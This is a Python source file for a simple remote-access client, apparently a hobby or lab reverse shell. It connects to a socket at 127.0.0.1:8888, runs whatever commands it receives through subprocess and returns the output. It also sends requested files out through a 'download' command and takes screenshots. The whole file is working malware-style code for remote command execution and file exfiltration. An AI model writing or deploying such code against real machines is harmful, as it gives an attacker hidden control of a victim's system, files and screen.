import socket
import subprocess
import pyautogui
import random
import re
from fileSend import send_file

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def start_client():
    s.connect(('127.0.0.1', 8888))
    while True:
        file_name = None
        command = s.recv(1024).decode()
        download_check = re.findall('download\s?...*', command.lower())
        if command.lower() == 'exit':
            break
        if download_check:
            file_name = None
            for i in download_check:
                file_name = i
            print(file_name[9:])
            send_file(file_name[9:])
        if command.lower() == 'screenshot':
            print('a')
            screen_name = str(random.randint(1,9000)) + '.png'
            screen = pyautogui.screenshot(screen_name)
            s.send(screen_name.encode())
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

start_client()